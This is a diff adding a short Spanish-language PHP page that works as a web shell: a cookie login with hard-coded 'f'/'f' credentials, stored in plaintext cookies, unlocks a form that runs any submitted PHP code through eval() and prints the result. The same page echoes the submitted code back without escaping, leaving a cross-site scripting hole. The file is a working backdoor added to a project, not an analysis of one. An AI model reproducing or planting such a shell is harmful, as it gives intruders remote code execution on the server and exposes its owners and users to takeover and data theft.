@@ -1,0 +1,99 @@
+<?php
+
+if( isset($_GET['logout']) ) {
+	setcookie('user', '' ) ;
+	setcookie('pass', '' ) ;
+	header('location: run-php.php');
+}
+
+if( isset($_POST['user']) && isset($_POST['pass']) ) {
+	setcookie('user', $_POST['user']) ;
+	setcookie('pass', $_POST['pass']) ;
+	header('location: run-php.php');
+}
+
+$isLogged = false ;
+if( isset($_COOKIE['user']) && isset($_COOKIE['pass']) ) {
+
+	if ( $_COOKIE['user']=='f' && $_COOKIE['pass']=='f' ) {
+		$isLogged = true ; 
+	}
+
+} else {
+	setcookie('user', ' ' ) ;
+	setcookie('pass', ' ' ) ;
+	header('location: run-php.php');
+}
+
+?>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Untitled Document</title>
+</head>
+
+<body>
+
+<?php 
+if( $isLogged ) { 
+$comandos = isset($_POST['comandos']) ? $_POST['comandos'] : '' ; 
+$usarPre = isset($_POST['usar_pre']) ? ' checked="checked" ' : '' ; 
+?>
+
+<form id="form2" method="post" action="">
+  <label> Comandos PHP: &nbsp; &nbsp; [<a href="?logout">Borrar Cookie</a>]<br />
+  <textarea name="comandos" id="comandos" cols="45" rows="5"><?php echo $comandos; ?></textarea>
+  </label>
+  <label> <br />
+  
+  <input type="checkbox" <?php echo $usarPre; ?> name="usar_pre" id="usar_pre" />
+  </label>
+  Usar Tag &lt;PRE&gt;<br />
+  <label>
+  <input type="submit" name="button2" id="button2" value="Ejecutar" />
+  </label>
+</form>
+
+<div>
+<?php
+if( isset($_POST['comandos']) ) {
+	echo "<h3>Resultado:</h3>" ;
+	if( isset($_POST['usar_pre']) ) echo '<pre>' ;
+	echo eval("{$_POST['comandos']}") ;
+	if( isset($_POST['usar_pre']) ) echo '</pre>' ;
+}
+?>
+</div>
+
+<?php } else { ?>
+
+<form id="form1" method="post" action="">
+  <table width="300" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td width="145">Nombre:</td>
+      <td width="155"><label>
+        <input type="text" name="user" id="user" />
+      </label></td>
+    </tr>
+    <tr>
+      <td>Contraseña:</td>
+      <td><label>
+        <input type="password" name="pass" id="pass" />
+      </label></td>
+    </tr>
+    <tr>
+      <td>&nbsp;</td>
+      <td><label>
+        <input type="submit" name="button" id="button" value="Enviar" />
+      </label></td>
+    </tr>
+  </table>
+</form>
+
+<?php } ?>
+
+
+</body>
+</html>
